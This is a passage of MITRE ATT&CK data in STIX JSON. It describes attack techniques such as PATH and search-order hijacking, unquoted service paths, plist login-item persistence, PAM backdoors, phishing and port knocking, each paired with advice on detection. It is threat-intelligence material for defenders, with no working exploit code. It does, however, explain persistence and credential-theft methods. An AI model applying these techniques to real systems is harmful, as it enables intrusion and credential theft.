Property\",\"url\":\"https://msdn.microsoft.com/en-us/library/fd7hxfdd.aspx\"}],\"id\":\"attack-pattern--c4ad009b-6e13-4419-8d21-918a1652de02\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-07-06T18:49:35.645Z\",\"name\":\"Path Interception\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"revoked\":false,\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Stefan Kanthak\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\"],\"x_mitre_deprecated\":true,\"x_mitre_detection\":\"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \\\"findstr,\\\" \\\"net,\\\" and \\\"python\\\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious. \\n\\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\",\"x_mitre_effective_permissions\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-13T14:10:43.424Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.\\n\\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\\\system32</code> (e.g., <code>C:\\\\Windows\\\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\\n\\nFor example, if <code>C:\\\\example path</code> precedes </code>C:\\\\Windows\\\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\\\example path</code> will be called instead of the Windows system \\\"net\\\" when \\\"net\\\" is executed from the command-line.\",\"external_references\":[{\"external_id\":\"T1574.007\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574/007\"},{\"external_id\":\"CAPEC-capec\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/capec.html\"}],\"id\":\"attack-pattern--0c2d00da-7742-49e7-9928-4514e5075d32\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:02:40.983Z\",\"name\":\"Path Interception by PATH Environment Variable\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Stefan Kanthak\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\"],\"x_mitre_defense_bypassed\":[\"Application control\"],\"x_mitre_detection\":\"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \\\"findstr,\\\" \\\"net,\\\" and \\\"python\\\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\\n\\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-13T17:48:58.999Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\\n\\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program\'s directory.\\n\\nFor example, \\\"example.exe\\\" runs \\\"cmd.exe\\\" with the command-line argument <code>net user</code>. An adversary may place a program called \\\"net.exe\\\" within the same directory as example.exe, \\\"net.exe\\\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \\\"net.com\\\" in the same directory as \\\"net.exe\\\", then <code>cmd.exe /C net user</code> will execute \\\"net.com\\\" instead of \\\"net.exe\\\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\\n\\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\",\"external_references\":[{\"external_id\":\"T1574.008\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574/008\"},{\"external_id\":\"CAPEC-CAPEC\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/CAPEC.html\"},{\"description\":\"Microsoft. (n.d.). CreateProcess function. Retrieved December 5, 2014.\",\"source_name\":\"Microsoft CreateProcess\",\"url\":\"http://msdn.microsoft.com/en-us/library/ms682425\"},{\"description\":\"Tim Hill. (2014, February 2). The Windows NT Command Shell. Retrieved December 5, 2014.\",\"source_name\":\"Windows NT Command Shell\",\"url\":\"https://docs.microsoft.com/en-us/previous-versions//cc723564(v=technet.10)?redirectedfrom=MSDN#XSLTsection127121120120\"},{\"description\":\"Microsoft. (n.d.). WinExec function. Retrieved December 5, 2014.\",\"source_name\":\"Microsoft WinExec\",\"url\":\"http://msdn.microsoft.com/en-us/library/ms687393\"},{\"description\":\"Microsoft. (2011, October 24). Environment Property. Retrieved July 27, 2016.\",\"source_name\":\"Microsoft Environment Property\",\"url\":\"https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN\"}],\"id\":\"attack-pattern--58af3705-8740-4c68-9329-ec015a7013c2\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-26T20:03:27.496Z\",\"name\":\"Path Interception by Search Order Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Stefan Kanthak\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \\\"findstr,\\\" \\\"net,\\\" and \\\"python\\\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\\n\\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\\n\",\"x_mitre_effective_permissions\":[\"Administrator\",\"SYSTEM\",\"User\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-13T13:51:58.519Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary\'s executable to launch.\\n\\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\\\unsafe path with space\\\\program.exe</code> vs. <code>\\\"C:\\\\safe path with space\\\\program.exe\\\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\\\program files\\\\myapp.exe</code>, an adversary may create a program at <code>C:\\\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\\n\\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.\",\"external_references\":[{\"external_id\":\"T1574.009\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574/009\"},{\"external_id\":\"CAPEC-capec\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/capec.html\"},{\"description\":\"Microsoft. (2017, April 20). HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services Registry Tree. Retrieved March 16, 2020.\",\"source_name\":\"Microsoft CurrentControlSet Services\",\"url\":\"https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree\"},{\"description\":\"Mark Baggett. (2012, November 8). Help eliminate unquoted path vulnerabilities. Retrieved November 8, 2012.\",\"source_name\":\"Help eliminate unquoted path\",\"url\":\"https://isc.sans.edu/diary/Help+eliminate+unquoted+path+vulnerabilities/14464\"},{\"description\":\"HackHappy. (2018, April 23). Windows Privilege Escalation – Unquoted Services. Retrieved August 10, 2018.\",\"source_name\":\"Windows Unquoted Services\",\"url\":\"https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/\"},{\"description\":\"absolomb. (2018, January 26). Windows Privilege Escalation Guide. Retrieved August 10, 2018.\",\"source_name\":\"Windows Privilege Escalation Guide\",\"url\":\"https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/\"}],\"id\":\"attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-26T19:55:39.867Z\",\"name\":\"Path Interception by Unquoted Path\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Stefan Kanthak\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \\\"findstr,\\\" \\\"net,\\\" and \\\"python\\\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\\n\\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:28.471Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.\",\"external_references\":[{\"external_id\":\"T1120\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1120\"},{\"external_id\":\"CAPEC-646\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/646.html\"}],\"id\":\"attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T17:42:03.337Z\",\"name\":\"Peripheral Device Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"PowerShell logs\",\"API monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.2\"}",
    "{\"created\":\"2017-05-31T21:30:55.471Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to find group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\",\"external_references\":[{\"external_id\":\"T1069\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1069\"},{\"external_id\":\"CAPEC-576\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/576.html\"}],\"id\":\"attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T17:48:28.002Z\",\"name\":\"Permission Groups Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Microsoft Threat Intelligence Center (MSTIC)\"],\"x_mitre_data_sources\":[\"Azure activity logs\",\"Office 365 account logs\",\"API monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"Office 365\",\"Azure AD\",\"AWS\",\"GCP\",\"Azure\",\"SaaS\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2020-03-02T18:45:07.892Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may send phishing messages to elicit sensitive information and/or gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\\n\\nAdversaries may send victim’s emails containing malicious attachments or links, typically to execute malicious code on victim systems or to gather credentials for use of [Valid Accounts](https://attack.mitre.org/techniques/T1078). Phishing may also be conducted via third-party services, like social media platforms.\",\"external_references\":[{\"external_id\":\"T1566\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1566\"},{\"external_id\":\"CAPEC-98\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/98.html\"}],\"id\":\"attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-28T00:04:46.427Z\",\"name\":\"Phishing\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Packet capture\",\"Web proxy\",\"Email gateway\",\"Mail server\",\"Network intrusion detection system\",\"Detonation chamber\",\"SSL/TLS inspection\",\"Anti-virus\"],\"x_mitre_detection\":\"Network intrusion detection systems and email gateways can be used to detect phishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\\n\\nURL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they\'re potentially malicious, or wait and capture the content if a user visits the link.\\n\\nBecause most common third-party services used for phishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware.\\n\\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user\'s computer. Many possible detections of follow-on behavior may take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"SaaS\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1150\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1150\"},{\"description\":\"Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy\'s \'Komplex\' OS X Trojan. Retrieved July 8, 2017.\",\"source_name\":\"Sofacy Komplex Trojan\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\"}],\"id\":\"attack-pattern--06780952-177c-4247-b978-79c357fb311f\",\"modified\":\"2020-03-17T13:03:25.670Z\",\"name\":\"Plist Modification\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T20:02:59.149Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify plist files to run a program during system boot or user login. Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UTF-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user\'s privileges). \\n\\nAdversaries can modify plist files to execute their code as part of establishing persistence. plists may also be used to elevate privileges since they may execute in the context of another user.(Citation: Sofacy Komplex Trojan) \\n\\nA specific plist used for execution at login is <code>com.apple.loginitems.plist</code>.(Citation: Methods of Mac Malware Persistence) Applications under this plist run under the logged in user\'s context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them.(Citation: Adding Login Items) Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). Some of these applications can open visible dialogs to the user, but they don’t all have to since there is an option to \\\"hide\\\" the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method <code> SMLoginItemSetEnabled</code> can be used to set Login Items, but scripting languages like [AppleScript](https://attack.mitre.org/techniques/T1059/002) can do this as well. (Citation: Adding Login Items)\",\"external_references\":[{\"external_id\":\"T1547.011\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547/011\"},{\"description\":\"Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy\'s \'Komplex\' OS X Trojan. Retrieved July 8, 2017.\",\"source_name\":\"Sofacy Komplex Trojan\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\"},{\"description\":\"Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.\",\"source_name\":\"Methods of Mac Malware Persistence\",\"url\":\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\"},{\"description\":\"Apple. (2016, September 13). Adding Login Items. Retrieved July 11, 2017.\",\"source_name\":\"Adding Login Items\",\"url\":\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLoginItems.html\"},{\"description\":\"Patrick Wardle. (2015). Malware Persistence on OS X Yosemite. Retrieved July 10, 2017.\",\"source_name\":\"Malware Persistence on OS X\",\"url\":\"https://www.rsaconference.com/writable/presentations/file_upload/ht-r03-malware-persistence-on-os-x-yosemite_final.pdf\"},{\"description\":\"Thomas Reed. (2017, July 7). New OSX.Dok malware intercepts web traffic. Retrieved July 10, 2017.\",\"source_name\":\"OSX.Dok Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/\"}],\"id\":\"attack-pattern--6747daa2-3533-4e78-8fb8-446ebb86448a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-06-20T19:57:36.136Z\",\"name\":\"Plist Modification\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like \\\"Knock Knock\\\" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.\\n\\nAll the login items created via shared file lists are viewable by going to the Apple menu -> System Preferences -> Users & Groups -> Login items. This area (and the corresponding file locations) should be monitored and allowed for known good applications. Otherwise, Login Items are located in <code> Contents/Library/LoginItems </code> within an application bundle, so these paths should be monitored as well.(Citation: Adding Login Items)\\n\\nMonitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-06-26T04:01:09.648Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\\n\\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\\n\\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)\",\"external_references\":[{\"external_id\":\"T1556.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1556/003\"},{\"description\":\"Apple. (2011, May 11). PAM - Pluggable Authentication Modules. Retrieved June 25, 2020.\",\"source_name\":\"Apple PAM\",\"url\":\"https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt\"},{\"description\":\"die.net. (n.d.). pam_unix(8) - Linux man page. Retrieved June 25, 2020.\",\"source_name\":\"Man Pam_Unix\",\"url\":\"https://linux.die.net/man/8/pam_unix\"},{\"description\":\"Red Hat. (n.d.). CHAPTER 2. USING PLUGGABLE AUTHENTICATION MODULES (PAM). Retrieved June 25, 2020.\",\"source_name\":\"Red Hat PAM\",\"url\":\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/managing_smart_cards/pluggable_authentication_modules\"},{\"description\":\"zephrax. (2018, August 3). linux-pam-backdoor. Retrieved June 25, 2020.\",\"source_name\":\"PAM Backdoor\",\"url\":\"https://github.com/zephrax/linux-pam-backdoor\"},{\"description\":\"Fernández, J. M. (2018, June 27). Exfiltrating credentials via PAM backdoors & DNS requests. Retrieved June 26, 2020.\",\"source_name\":\"PAM Creds\",\"url\":\"https://x-c3ll.github.io/posts/PAM-backdoor-DNS/\"}],\"id\":\"attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-30T19:16:10.008Z\",\"name\":\"Pluggable Authentication Modules\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Scott Knight, @sdotknight, VMware Carbon Black\",\"George Allen, VMware Carbon Black\"],\"x_mitre_data_sources\":[\"Authentication logs\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor PAM configuration and module paths (ex: <code>/etc/pam.d/</code>) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.\\n\\nLook for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"root\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-07-01T18:23:25.002Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\\n\\nThis technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\\n\\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\",\"external_references\":[{\"external_id\":\"T1205.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1205/001\"},{\"description\":\"Hartrell, Greg. (2002, August). Get a handle on cd00r: The invisible backdoor. Retrieved October 13, 2018.\",\"source_name\":\"Hartrell cd00r 2002\",\"url\":\"https://www.giac.org/paper/gcih/342/handle-cd00r-invisible-backdoor/103631\"}],\"id\":\"attack-pattern--8868cb5b-d575-4a60-acb2-07d37389a2fd\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-07-01T18:23:25.002Z\",\"name\":\"Port Knocking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"Record network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
